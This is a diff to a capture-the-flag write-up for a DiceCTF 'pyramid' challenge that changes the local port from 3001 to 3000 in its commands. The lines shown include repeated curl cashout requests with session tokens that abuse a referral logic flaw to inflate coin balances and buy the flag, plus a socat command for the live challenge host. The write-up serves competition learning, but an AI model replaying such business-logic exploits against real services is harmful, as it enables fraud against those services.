@@ -466,11 +466,11 @@ curl 'https://pyramid.dicec.tf/new?' --data 'refer=2a089074b391fda24a00328a87acd
 We can now begin our infinite money glitch, repeating until we hit our `100_000_000_000` target.
 
 ```sh
-curl -Ls 'http://localhost:3001/cashout?' -b 'token=00652973dec9316da482037451ad95e2' | grep -P strong
-curl -Ls 'http://localhost:3001/cashout?' -b 'token=00652973dec9316da482037451ad95e2' | grep -P strong
-curl -Ls 'http://localhost:3001/cashout?' -b 'token=00652973dec9316da482037451ad95e2' | grep -P strong
-curl -Ls 'http://localhost:3001/cashout?' -b 'token=00652973dec9316da482037451ad95e2' | grep -P strong
-curl -Ls 'http://localhost:3001/cashout?' -b 'token=00652973dec9316da482037451ad95e2' | grep -P strong
+curl -Ls 'http://localhost:3000/cashout?' -b 'token=00652973dec9316da482037451ad95e2' | grep -P strong
+curl -Ls 'http://localhost:3000/cashout?' -b 'token=00652973dec9316da482037451ad95e2' | grep -P strong
+curl -Ls 'http://localhost:3000/cashout?' -b 'token=00652973dec9316da482037451ad95e2' | grep -P strong
+curl -Ls 'http://localhost:3000/cashout?' -b 'token=00652973dec9316da482037451ad95e2' | grep -P strong
+curl -Ls 'http://localhost:3000/cashout?' -b 'token=00652973dec9316da482037451ad95e2' | grep -P strong
 # ... less than a minute later
 #            You have <strong>131539322909.97028</strong> coins.
 #            You have referred <strong>131539322926.97028</strong> users.
@@ -478,7 +478,7 @@ curl -Ls 'http://localhost:3001/cashout?' -b 'token=00652973dec9316da482037451ad
 
 Let's buy our flag!
 ```sh
-curl -Ls 'http://localhost:3001/buy?' -b 'token=59e3c3caf0dcb24ec8ec6c8d41fdfa9c'
+curl -Ls 'http://localhost:3000/buy?' -b 'token=59e3c3caf0dcb24ec8ec6c8d41fdfa9c'
 ```
 
 And we got it (locally)!
@@ -494,7 +494,7 @@ And we got it (locally)!
 
 For running it against the actual challenge...
 * We can't use netcat, since TLS. However, we can use `socat`: `socat ssl:pyramid.dicec.tf:443,crlf stdio`  
-  The equivalent http localhost equivalent is `socat tcp:localhost:3001,crlf stdio`, incidentally.
+  The equivalent http localhost equivalent is `socat tcp:localhost:3000,crlf stdio`, incidentally.
 * Our base URL becomes `https://pyramid.dicec.tf/`
 
 For glory reasons, here's the flag as redeemed from the browser!
